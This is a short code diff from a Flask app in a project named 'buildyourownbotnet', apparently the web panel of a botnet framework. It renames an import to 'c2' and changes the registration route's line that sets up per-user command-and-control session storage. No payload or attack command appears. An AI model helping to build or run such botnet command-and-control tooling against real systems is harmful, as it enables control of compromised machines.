@@ -7,7 +7,7 @@ from flask import (
 )
 from flask_login import login_user, logout_user, current_user, login_required
 
-from buildyourownbotnet import app, db, bcrypt, client, server
+from buildyourownbotnet import app, db, bcrypt, client, c2
 from buildyourownbotnet.core.dao import user_dao
 from buildyourownbotnet.users.forms import RegistrationForm, LoginForm, UpdateAccountForm, ResetPasswordForm
 from buildyourownbotnet.models import User, Session
@@ -52,7 +52,7 @@ def register():
 				os.makedirs(files_dir)
 
 			# initialize c2 session storage
-			server.c2.sessions[user.username] = {}
+			c2.sessions[user.username] = {}
 
 			# notify user and redirect to login
 			flash("You have successfully registered!", 'info')
